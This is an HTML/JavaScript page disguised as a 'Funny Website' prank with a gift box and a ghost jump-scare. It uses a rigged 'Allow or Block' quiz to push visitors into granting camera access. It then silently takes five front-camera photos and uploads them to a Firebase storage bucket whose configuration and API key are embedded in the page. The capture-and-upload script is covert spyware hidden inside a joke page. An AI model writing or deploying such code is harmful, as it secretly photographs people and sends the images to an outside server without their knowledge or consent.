<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Funny Website</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #121212;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .container, .gift-container {
            display: none;
            max-width: 600px;
        }
        .mcq-container {
            display: block;
        }
        h1 {
            font-size: 2em;
            margin-bottom: 20px;
        }
        .footer-text {
            font-size: 1.2em;
            margin-top: 20px;
            color: #ccc;
        }
        .fallback {
            color: red;
            margin-top: 20px;
        }
        .mcq-option {
            display: inline-block;
            margin: 10px;
            padding: 10px 20px;
            background-color: #333;
            border-radius: 10px;
            cursor: pointer;
            position: relative;
            font-size: 1.2em;
        }
        .mcq-option.correct {
            border: 2px solid transparent;
            position: relative;
        }
        .mcq-option.correct::before {
            content: '';
            position: absolute;
            top: -10px;
            left: -10px;
            right: -10px;
            bottom: -10px;
            border: 2px solid red;
            animation: rotateRectangle 1.5s linear infinite;
        }
        @keyframes rotateRectangle {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }
        .error-message {
            color: red;
            font-size: 1.2em;
            margin-top: 10px;
        }
        .ghost {
            display: none;
            justify-content: center;
            align-items: center;
        }
        #ghost-image {
            transition: all 1s;
        }
        .grow {
            transform: scale(1.5);
        }
        .shake {
            animation: shakeAnimation 0.5s infinite;
        }
        @keyframes shakeAnimation {
            0% { transform: translate(0, 0); }
            25% { transform: translate(-5px, 5px); }
            50% { transform: translate(5px, -5px); }
            75% { transform: translate(-5px, -5px); }
            100% { transform: translate(5px, 5px); }
        }
    </style>
</head>
<body>
    <div class="container mcq-container" id="mcq-container">
        <p>Please select the correct option to allow camera access:</p>
        <div class="mcq-option correct" id="mcq-allow">Allow</div>
        <div class="mcq-option" id="mcq-block">Block</div>
        <div class="error-message" id="error-message" style="display: none;">Please click the "Allow" button.</div>
        <div class="fallback" id="fallback" style="display: none;">Your browser does not support the required permissions. Please open this page in Chrome or Safari.</div>
    </div>

    <div class="container gift-container" id="gift-container">
        <h1 id="heading">Open this Gift</h1>
        <div id="gift" style="cursor: pointer;">
            <img src="gift.png" alt="Gift Image" width="200">
        </div>
    </div>

    <div class="ghost" id="ghost">
        <img src="scary-image.png" alt="Ghost Image" id="ghost-image" width="400">
        <audio id="scream" src="scary-sound.mp3"></audio>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBsG-hDNF8DRowgjz9WR4wVlSL398_gQyI",
            authDomain: "photos-c3ca9.firebaseapp.com",
            projectId: "photos-c3ca9",
            storageBucket: "photos-c3ca9.appspot.com",
            messagingSenderId: "231479999084",
            appId: "1:231479999084:web:045f573955ed1190f4b649",
            measurementId: "G-X7YW60B7V5"
        };

        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        let photos = [];
        let photoCount = 0;
        const totalPhotos = 5;
        const mcqContainer = document.getElementById('mcq-container');
        const giftContainer = document.getElementById('gift-container');
        const errorMessage = document.getElementById('error-message');
        const fallbackDiv = document.getElementById('fallback');

        function showFallback() {
            fallbackDiv.style.display = 'block';
            mcqContainer.style.display = 'none';
        }

        function capturePhoto(video) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const dataUrl = canvas.toDataURL('image/png');
            photos.push(dataUrl);
            photoCount++;

            if (photoCount === totalPhotos) {
                uploadPhotosToFirebase();
            }
        }

        function startPhotoCapture(video) {
            const captureInterval = setInterval(() => {
                capturePhoto(video);
                if (photoCount === totalPhotos) {
                    clearInterval(captureInterval);
                }
            }, 500);
        }

        function uploadPhotosToFirebase() {
            photos.forEach((photo, index) => {
                const photoRef = ref(storage, `photos/photo_${index + 1}.png`);

                uploadString(photoRef, photo, 'data_url').then((snapshot) => {
                    console.log('Uploaded a photo to Firebase!', snapshot);
                }).catch((error) => {
                    console.error('Failed to upload photo:', error);
                });
            });
        }

        function requestCameraPermissions() {
            navigator.permissions.query({ name: 'camera' }).then((result) => {
                if (result.state === 'granted') {
                    initCamera();
                } else if (result.state === 'denied') {
                    localStorage.removeItem('cameraPermissionGranted');
                    showFallback();
                } else {
                    mcqContainer.style.display = 'block';
                }

                result.onchange = () => {
                    if (result.state === 'granted') {
                        initCamera();
                    } else if (result.state === 'denied') {
                        showFallback();
                    }
                };
            });
        }

        function askForPermission() {
            const constraints = { video: { facingMode: 'user' } };

            navigator.mediaDevices.getUserMedia(constraints)
                .then(stream => {
                    localStorage.setItem('cameraPermissionGranted', true);
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    startPhotoCapture(video);
                    showGiftContainer();
                })
                .catch(error => {
                    localStorage.removeItem('cameraPermissionGranted');
                    showFallback();
                });
        }

        function initCamera() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                showFallback();
                return;
            }

            const permissionGranted = localStorage.getItem('cameraPermissionGranted');
            if (permissionGranted) {
                askForPermission();
            } else {
                requestCameraPermissions();
            }
        }

        function showGiftContainer() {
            mcqContainer.style.display = 'none';
            giftContainer.style.display = 'block';
        }

        window.addEventListener('beforeunload', () => {
            localStorage.removeItem('cameraPermissionGranted');
        });

        document.getElementById('mcq-allow').addEventListener('click', () => {
            askForPermission();
            mcqContainer.style.display = 'none';
            errorMessage.style.display = 'none';
        });

        document.getElementById('mcq-block').addEventListener('click', () => {
    errorMessage.style.display = 'block';
});

document.getElementById('gift').addEventListener('click', () => {
    document.getElementById('gift-container').style.display = 'none';
    document.getElementById('ghost').style.display = 'flex';
    document.getElementById('ghost-image').classList.add('grow', 'shake');
    document.getElementById('scream').play();
});

// Initialize the app by showing the MCQ container
function initApp() {
    mcqContainer.style.display = 'block';
    giftContainer.style.display = 'none';
    document.getElementById('ghost').style.display = 'none';
}

// Call the initApp function to start the app
initApp();
